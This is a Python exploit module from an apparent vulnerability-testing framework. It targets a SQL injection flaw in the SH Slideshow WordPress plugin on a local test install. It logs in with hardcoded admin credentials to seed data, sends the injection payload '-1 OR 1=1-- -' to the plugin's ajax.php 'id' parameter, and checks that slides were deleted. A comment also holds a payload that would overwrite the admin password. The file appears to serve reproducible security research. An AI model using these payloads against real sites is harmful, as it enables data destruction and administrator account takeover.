
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.

import framework  
import urllib
import httplib
  

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_74813",
                  'Description' : "SH Slideshow Plugin for WordPress contains a flaw that " \
                                  "may allow an attacker to carry out an SQL injection " \
                                  "attack. The issue is due to the wp-content/plugins/sh-slideshow/ajax.php " \
                                  "script not properly sanitizing user-supplied input to the 'id' parameter.",
                  'References' : [['OSVDB','74813'],
                                  ['http://osvdb.org/show/osvdb/74813'],
                                  ['http://www.exploit-db.com/exploits/17748/']],
                  'Target' : "Wordpress 3.2",
                  'Type' : "SQL",
                  'Plugin' : "SH Slideshow Plugin 3.1.4",
                  'Privileged' : False
                  }
                    
    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return

    def setup(self, target_system_dir):
        # Create some slides
        driver = self.create_selenium_driver(javascript=False)
                
        driver.get("http://127.0.0.1/wordpress/wp-admin")
        driver.get_element(by_id="user_login").send_keys("wpadmin")
        driver.get_element(by_id="user_pass").send_keys("wpadminpw21")
        driver.get_element(by_id="wp-submit").click()
        

        driver.get("http://127.0.0.1/wordpress/wp-admin/admin.php?page=sh-slideshow/mini-slideshow.php")

        input_el = driver.get_element(by_xpath="//*[@id='sname']")
        input_el.send_keys("new_slideshow")
        
        driver.get_element(by_xpath="//input[@name='submit' and @type='submit']").click()
        driver.get_element(by_xpath="//*[@id='message']")
        

        driver.get("http://127.0.0.1/wordpress/wp-admin/admin.php?page=sh-slideshow/mini-slideshow.php&pg_no=1&action=slides&id=1")
        
        slide_el = driver.get_element(by_xpath="//input[@name='slide[]']")
        slide_el.send_keys("dummy slide")
        
        driver.get_element(by_xpath="//input[@name='submit' and @type='submit']").click()
        driver.get_element(by_xpath="//*[@id='message']")

        driver.cleanup()
        return

    def exploit(self):

        form_data = urllib.urlencode({'id' : '-1 OR 1=1-- -'})

        # AND 1=IF(2>1,(update wp_users SET user_pass=MD5(\'no\') WHERE user_login=\'wpadmin\'),0)-- %20
        #update wp_users SET user_pass=MD5('ok') WHERE user_login='wpadmin'
        headers = {"Host":"127.0.0.1",
                   "Content-Type":"application/x-www-form-urlencoded",
                   "Accept": "application/json, text/javascript, */*;"
                   }
        
        conn = httplib.HTTPConnection("127.0.0.1")
        conn.request("POST",
                     "http://127.0.0.1/wordpress/wp-content/plugins/sh-slideshow/ajax.php",
                     form_data,
                     headers)
        
        response = conn.getresponse()
        data = response.read()
        conn.close()
        self.logger.info("Query response: %s", data)

        return                

    def verify(self):
        verified = False
        driver = self.create_selenium_driver()
                
        driver.get("http://127.0.0.1/wordpress/wp-admin")
        driver.get_element(by_id="user_login").send_keys("wpadmin")
        driver.get_element(by_id="user_pass").send_keys("wpadminpw21")
        driver.get_element(by_id="wp-submit").click()

        driver.get("http://127.0.0.1/wordpress/wp-admin/admin.php?page=sh-slideshow/mini-slideshow.php&pg_no=1&action=slides&id=1")

        if driver.page_source.find("dummy slide") == -1:
            self.logger.info("Deleted slide with SQL injection")
            verified = True
        else:
            self.logger.info("SQL injection failed")

        return verified
